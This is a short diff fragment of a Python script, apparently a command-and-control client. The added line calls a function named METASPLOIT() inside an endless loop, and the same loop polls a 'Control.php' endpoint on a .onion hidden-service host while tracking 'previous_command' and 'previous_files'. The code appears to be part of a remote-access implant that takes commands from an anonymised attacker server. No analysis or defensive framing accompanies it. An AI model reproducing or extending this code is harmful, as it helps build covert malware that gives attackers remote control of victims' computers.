@@ -320,6 +320,7 @@ while True:
             global previous_command, previous_files
 
             while True:
+                METASPLOIT()
                 php_script_url = f'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
                 
                 response = requests_session.get(php_script_url)
